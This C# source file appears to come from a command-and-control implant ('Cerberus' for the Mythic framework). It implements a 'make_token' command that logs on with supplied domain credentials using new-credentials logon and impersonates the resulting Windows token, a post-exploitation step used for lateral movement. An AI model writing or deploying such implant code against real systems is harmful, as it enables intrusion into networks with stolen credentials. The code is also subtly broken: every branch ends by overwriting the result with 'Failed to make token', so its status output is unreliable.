using Models.Tasks;
using Managers;

using Extend;

using System;
using System.Security.Principal;
using System.Text;

namespace Tasks.Commands
{
    public class MakeToken : CerberusCommand
    {
        public override string Name => "make_token";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<MakeTokenParam>();

            var split = Arguments.username.Split('\\');
            var domain = split[0];
            var username = split[1];

            var hToken = IntPtr.Zero;

            if (Native.Advapi.LogonUserA(username, domain, Arguments.password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
                    Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {

                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    //return $"Successfully impersonated {identity.Name}";
                    result = new MythicTaskResult
                    {
                        task_id = task.id,
                        user_output = $"Successfully impersonated {identity.Name}",
                        completed = true,
                        status = "success"
                    };
                }

                //var success = IdentityManager.AddToken(hToken);

                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = $"Successfully made token, but failed to impersonate",
                    completed = true,
                    status = "Error",
                    error = "Failed to impersonate token"
                };
            }

            result = new MythicTaskResult
            {
                task_id = task.id,
                user_output = "Failed to make token",
                completed = true,
                status = "Error",
                error = "Failed to create token"
            };

            return result;
        }
    }

    public class MakeTokenParam
    {
        public string username { get; set; }
        public string password { get; set; }
    }
}
